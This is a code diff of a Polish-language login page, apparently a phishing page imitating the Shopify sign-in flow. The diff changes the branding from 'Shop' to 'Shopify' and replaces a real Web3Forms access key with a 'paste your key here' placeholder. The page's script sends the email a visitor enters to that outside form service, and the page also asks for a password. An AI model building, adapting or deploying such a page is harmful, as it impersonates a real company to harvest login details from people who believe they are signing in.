@@ -432,7 +432,7 @@ input.error:focus {
 <div class="card" id="emailCard">
     <div class="circle"><img src="Logo.png" alt=""></div>
   <h1>Zaloguj się</h1>
-  <div class="subtitle">Przejdź do: Shop account</div>
+  <div class="subtitle">Przejdź do: Shopify account</div>
 
   <label for="email">E-mail</label>
   <input id="email" type="text" autocomplete="off">
@@ -458,7 +458,7 @@ input.error:focus {
   </div>
 
   <div class="bottom">
-    Pierwszy raz w Shop?
+    Pierwszy raz w Shopify?
     <a href="#">Rozpocznij ➞</a>
   </div>
 </div>
@@ -466,7 +466,7 @@ input.error:focus {
   <div class="circle"><img src="Logo.png" alt=""></div>
 
   <h1>Zaloguj się</h1>
-  <div class="subtitle">Przejdź do: Shop <span>account</span></div>
+  <div class="subtitle">Przejdź do: Shopify <span>account</span></div>
 
   <div class="email-box">
     <span id="shownEmail"></span>
@@ -492,7 +492,7 @@ input.error:focus {
 </div>
 <div class="help">Potrzebujesz pomocy?</div>
 <div class="terms">
- Kontynuując, akceptujesz Warunki i Polityka prywatności oraz wyrażasz zgodę na otrzymywanie e-maili marketingowych od Shop. W każdej chwili możesz zrezygnować z subskrypcji.
+ Kontynuując, akceptujesz Warunki i Polityka prywatności oraz wyrażasz zgodę na otrzymywanie e-maili marketingowych od Shopify. W każdej chwili możesz zrezygnować z subskrypcji.
 </div>
 
 <script>
@@ -527,7 +527,7 @@ continueBtn.addEventListener("click", async () => {
       "Accept": "application/json"
     },
     body: JSON.stringify({
-      access_key: "13b26a27-bd0d-4893-a3de-62dacb8bf44e",
+      access_key: "TU_WKLEJ_SWÓJ_KLUCZ_WEB3FORMS",
       email: emailValue,
       subject: "Nowy formularz ze strony"
     })
@@ -568,11 +568,13 @@ eyeIcon.addEventListener("click", () => {
 
         passwordInput.type = "text";
 
+
         eyeIcon.src = "eye-closed.png";
 
     } else {
 
         passwordInput.type = "password";
+
 
         eyeIcon.src = "eye-open.png";
 
